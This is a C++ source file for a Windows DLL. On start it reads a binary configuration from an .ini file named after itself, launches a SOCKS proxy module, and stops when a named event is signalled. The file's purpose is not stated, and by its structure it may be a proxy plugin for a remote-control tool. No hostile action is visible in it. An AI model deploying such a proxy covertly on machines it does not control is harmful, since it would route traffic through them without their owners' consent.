// PcLKey.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "PcLKey.h"
#include "MySocksModule.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

HINSTANCE		ghInstance = NULL;

/////////////////////////////////////////////////////////////////////////////
// CPcLKeyApp

BEGIN_MESSAGE_MAP(CPcLKeyApp, CWinApp)
	//{{AFX_MSG_MAP(CPcLKeyApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcLKeyApp construction

CPcLKeyApp::CPcLKeyApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CPcLKeyApp object

CPcLKeyApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CPcLKeyApp initialization

BOOL CPcLKeyApp::InitInstance()
{
	ghInstance = m_hInstance;
	WSADATA	data = {0};
	WSAStartup(MAKEWORD(2, 2), &data);
	return TRUE;
}

BOOL MyReadFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	HANDLE hFile = CreateFile(
			m_FileName,  
			GENERIC_READ,   
			FILE_SHARE_READ, 
			NULL,           
			OPEN_EXISTING,      
			FILE_ATTRIBUTE_NORMAL, 
			NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	ReadFile(hFile, pData, nLen, &nReadLen, NULL);
	CloseHandle(hFile);
	return TRUE;
}

void WINAPI StartSocks()
{
	char m_ModuleFileName[256] = {0};
	GetModuleFileName(ghInstance, m_ModuleFileName, 255);
	char* pStart = strrchr(m_ModuleFileName, '\\');
	char* pEnd = strrchr(m_ModuleFileName, '.');

	char m_AppName[256] = {0};
	memcpy(m_AppName, pStart + 1, pEnd - pStart - 1);

	//数据文件名称
	char m_SocksFilePath[256] = {0};
	*pEnd = 0x00;
	lstrcat(m_ModuleFileName, ".ini");
	strcpy(m_SocksFilePath, m_ModuleFileName);

	//取配置参数
	MYSOCKSINFO m_SocksInfo = {0};
	if(!MyReadFile(m_ModuleFileName, &m_SocksInfo, sizeof(MYSOCKSINFO)))
	{
		return;
	}

	//取参数
	CMySocksModule m_Socks;
	if(!m_Socks.StartWork(&m_SocksInfo))
	{
		return;
	}

	//退出事件
	char m_WaitEventName[256] = {0};
	lstrcpy(m_WaitEventName, m_AppName);
	lstrcat(m_WaitEventName, m_AppName);
	HANDLE m_SocksExitEvent = CreateEvent(NULL, TRUE, FALSE, m_WaitEventName);

	//等待退出
	WaitForSingleObject(m_SocksExitEvent, 0xfffffff);
	m_Socks.StopWork();
	Sleep(500);

	CloseHandle(m_SocksExitEvent);
}

void WINAPI StopSocks()
{
	char m_ModuleFileName[256] = {0};
	GetModuleFileName(ghInstance, m_ModuleFileName, 255);
	char* pStart = strrchr(m_ModuleFileName, '\\');
	char* pEnd = strrchr(m_ModuleFileName, '.');

	char m_AppName[256] = {0};
	memcpy(m_AppName, pStart + 1, pEnd - pStart - 1);

	//退出事件
	char m_WaitEventName[256] = {0};
	lstrcpy(m_WaitEventName, m_AppName);
	lstrcat(m_WaitEventName, m_AppName);
	HANDLE hExitEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, m_WaitEventName);
	if(hExitEvent != NULL)
	{
		SetEvent(hExitEvent);
		CloseHandle(hExitEvent);
	}
}